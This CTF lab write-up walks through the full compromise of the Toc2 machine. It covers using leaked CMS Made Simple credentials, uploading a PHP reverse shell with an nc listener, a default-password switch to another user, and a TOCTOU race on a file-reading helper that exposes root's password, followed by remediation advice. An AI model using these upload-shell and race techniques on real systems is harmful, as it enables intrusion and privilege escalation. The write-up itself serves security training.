## Toc2

Medium-difficulty Linux machine with a maintenance page hiding a CMS Made Simple installation. Credentials left in the page give access to the CMS admin area, where a file upload leads to a shell as `www-data`. A default password on a user account gives access to `frank`. A SUID-style helper program that reads a root-owned password file is exploited with a race condition, which reveals root's password.

**Target:** 10.49.171.110 (toc2)
**Difficulty:** Medium
**Attack Path:** Port scan → Maintenance page → robots.txt → CMS Made Simple install page → Login with leaked credentials → File upload shell → www-data → frank's password → readcreds race condition → root

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.49.171.110
```

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache 2.4.41 (Ubuntu)
```

Only two ports are open, so the web application on port 80 is the main target.

**Service and version scan**

```
nmap -sV -sC -p 22,80 10.49.171.110
```

```
|_http-robots.txt: 1 disallowed entry
|_/cmsms/cmsms-2.1.6-install.php
|_http-title: Site Maintenance
```

**Key findings:**
- The main page is titled "Site Maintenance."
- `robots.txt` lists a CMS install file, which is a useful path to note.

---

### PART 2: MAINTENANCE PAGE AND LEAKED CREDENTIALS

The main page displays a maintenance message from a staff member, Hunter:

```
Sorry for the inconvenience but management have once again asked for more than
we can deliver. The web server isn't going to be ready for the web dev team to
build on for another few days. Just in case anyone around here except me wants
to do anything: cmsmsuser:devpass
```

**Result:** A username and password were left on a public page:

```
cmsmsuser : devpass
```

A second note on the same page mentions a database named `cmsmsdb` that still needs setting up. This confirms the CMS installation is not finished.

---

### PART 3: CMS MADE SIMPLE

**Discovering the CMS**

`robots.txt` disallows `/cmsms/cmsms-2.1.6-install.php`. Visiting the path shows CMS Made Simple version 2.1.6.

**Search for exploits**

```
msfconsole
search cmsms
```

```
0  exploit/multi/http/cmsms_showtime2_rce           2019-03-11  normal     CMS Made Simple Showtime2 File Upload RCE
1  exploit/multi/http/cmsms_upload_rename_rce       2018-07-03  excellent  CMS Made Simple Authenticated RCE via File Upload/Copy
2  exploit/multi/http/cmsms_object_injection_rce    2019-03-26  normal     CMS Made Simple Authenticated RCE via object injection
3  exploit/multi/http/cmsms_file_manager_auth_rce   2023-06-07  excellent  CmsMadeSimple Authenticated File Manager RCE
```

The modules that need authentication require the credentials from the maintenance page. The notes show the unauthenticated approach did not work, so the leaked credentials were used.

---

### PART 4: LOGIN AND FILE UPLOAD SHELL

**Log in to the CMS admin**

Use the leaked credentials to sign in to the CMS administration area:

```
Username: cmsmsuser
Password: devpass
```

**Upload a shell through the content manager**

The content manager's file upload feature accepts files into the site. A PHP reverse shell was generated from revshells.com, customized with the attacker IP and port, and uploaded through the CMS:

```
shell.php
```

Requesting the uploaded file triggers the connection back to the listener.

**Attacker: start a listener**

```
nc -lvnp 5555
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.171.110] 38468
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### PART 5: SHELL STABILIZATION

```
which python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm-256color
```

---

### PART 6: MOVING TO FRANK

**Home directory**

```
cd /home/frank
ls
new_machine.txt  root_access  user.txt
```

**Read the note**

```
cat new_machine.txt
```

The note says the user is moving to a new computer. It includes a default password for the work machines:

```
The inventory team sent me a new Thinkpad, the password is "password". It's
funny that the default password for all the work machines is something so
simple...
```

**Try the password**

```
su frank
Password: password
```

Login succeeds. Frank's user flag is in `user.txt`:

```
cat user.txt
[user flag: not recorded in notes]
```

**Takeaway:** Default passwords on work machines are a common and serious weakness. The note on this machine makes the risk visible.

---

### PART 7: THE READCREDS PROGRAM

**Files in root_access**

```
cd /home/frank/root_access
ls
readcreds  readcreds.c  root_password_backup
```

`root_password_backup` contains root's credentials, which only root should be able to read. `readcreds` is a program that prints the contents of a file, and the source is provided:

```c
int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n");
        exit(1);
    }

    if (!access(argv[1],R_OK)) {
        sleep(1);
        file_data = open(argv[1], O_RDONLY);
    } else {
        fprintf(stderr, "Cannot open %s \n", argv[1]);
        exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    }
    while(size>0);
}
```

**The flaw: time-of-check to time-of-use (TOCTOU)**

The program checks permissions with `access()`, then waits one second with `sleep(1)`, then opens the file with `open()`. Between the check and the open, the file can be swapped for something else. If the file passes the check when it is a file the user can read, but is replaced by a link to `root_password_backup` before `open()` runs, the program prints the protected file.

**Why this works:** `access()` checks the real user's permissions, but `open()` runs later and opens whatever the path points to at that moment. Repeatedly swapping the name between a harmless file and the protected file wins the race.

---

### PART 8: RACE CONDITION EXPLOIT

**Compile the rename helper**

The helper swaps two file names in a loop. It is based on a public exploit for a logrotate race:

```
cd /home/frank/root_access
gcc rename.c -o rename
```

**Run the swap**

```
./rename pwd root_password_backup
```

The helper keeps swapping the names `pwd` and `root_password_backup` in the background.

**In a second session, run readcreds**

```
./readcreds root_password_backup
```

If the timing lines up, `readcreds` reads the file while it is the protected one, and prints its contents.

**Result:**

```
Root Credentials: root:aloevera
```

Repeat the run if it fails. Each attempt has a random chance of hitting the window.

---

### PART 9: ROOT ACCESS

**Switch to root**

```
su - root
Password: aloevera
```

```
root@ip-10-49-171-110:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag**

```
cd /root
ls
root.txt  snap
cat root.txt
[root flag: not recorded in notes]
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (22, 80)
  ├─ Maintenance page
  └─ robots.txt reveals CMS install path

PHASE 2: Credential Discovery
  └─ cmsmsuser:devpass on maintenance page

PHASE 3: CMS Access
  ├─ Identify CMS Made Simple 2.1.6
  └─ Log in with leaked credentials

PHASE 4: Initial Access
  ├─ Upload PHP reverse shell via content manager
  └─ Shell as www-data

PHASE 5: Lateral Movement
  ├─ Read frank's new_machine.txt
  ├─ Default password "password"
  └─ su frank, user flag

PHASE 6: Root Credentials
  ├─ Read readcreds.c source
  ├─ Identify access() to open() race condition
  ├─ Run rename helper to swap files
  └─ Obtain root:aloevera

PHASE 7: Root
  └─ su - root, root flag
```

---

### VULNERABILITIES

1. **Leaked Credentials on Public Maintenance Page (High)**
   - Working CMS login placed in a page visible to anyone

2. **Unfinished CMS Installation Exposed (Medium)**
   - Install file listed in robots.txt and reachable
   - Database setup notes visible

3. **Authenticated File Upload Leading to RCE (Critical)**
   - CMS content manager accepts PHP files
   - Uploaded file runs as www-data

4. **Default Password on User Account (High)**
   - `frank` uses the default workstation password `password`
   - Password documented in a readable note

5. **TOCTOU Race Condition in readcreds (High)**
   - `access()` check and `open()` are separated by `sleep(1)`
   - Path can be swapped between the two calls

6. **Root Password Stored in Plaintext Backup (Critical)**
   - Root's credentials readable through the vulnerable program
   - Password reuse for root account access

---

### REMEDIATION

```
├─ Remove credentials from public pages and maintenance messages
├─ Block install scripts after setup; restrict or remove robots.txt entries for them
├─ Upgrade CMS Made Simple and restrict file uploads to safe types, stored outside the web root
├─ Enforce unique, strong passwords for all accounts; require a change on first login
├─ Replace access() followed by open() with open() first, then check the opened file descriptor with fstat()
├─ Store root credentials in a secure vault, not in a readable file
├─ Remove unnecessary setuid helpers or restrict them to narrowly scoped functions
└─ Monitor for unexpected su usage and changes to protected files
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- curl or browser (maintenance page and CMS access)
- Metasploit search (CMS Made Simple module review)
- revshells.com (PHP reverse shell)
- nc (listener)
- gcc (compiling the rename helper)
- su (account switching)

**Key Insight:** A leaked CMS login gave a web shell. A documented default password gave a second account. A race condition in a small file-reading program gave root's password.

**Concepts to Study:**
- Information disclosure via maintenance pages and robots.txt
- Authenticated file upload leading to RCE
- Default and reused passwords
- TOCTOU race conditions and the access()/open() pattern
- Safe file handling with open() and fstat()

# Jai Shri Ram
